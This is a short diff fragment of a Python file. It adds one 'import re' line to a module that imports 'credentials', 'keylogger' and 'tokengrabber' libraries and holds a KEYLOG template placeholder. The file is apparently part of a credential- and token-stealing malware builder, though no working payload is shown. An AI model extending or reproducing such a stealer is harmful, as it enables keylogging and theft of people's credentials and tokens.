@@ -15,6 +15,7 @@ from multiprocessing import Process
 import threading
 import json
 import ctypes
+import re
 from libraries import credentials,keylogger,tokengrabber
 
 KEYLOG = {KEYLOG}
